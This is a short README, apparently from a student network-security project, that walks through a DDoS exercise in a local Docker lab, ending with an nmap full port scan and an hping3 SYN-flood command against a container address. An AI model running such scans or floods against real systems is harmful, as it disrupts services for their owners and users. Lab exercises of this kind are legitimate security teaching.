# Network & Communication Security Project (DDoS Attack)

DDoS attack performed step by step.

1) First of all we start Swarmlab-hybrid by typing the following 2 commands in terminal
cd swarmlab-hybrid
./start.sh

Then we go to http://localhost:3088/ -> Instances -> Container -> Select dummy_service -> Connect -> Run in terminal "docker exec -it dummy_service /bin/sh"

After that we proceed inside the terminal by typing the following commands
$ docker exec -it dummy_service /bin/sh
$ ifconfig //(in order to find the inet addr we are looking for , in my case it was 172.21.0.2 )
$ nmap -p- 172.22.0.* //With this command we scan for open ports , in my case it was 3001
$ sudo hping3 -S 172.22.0.2 -p 3001
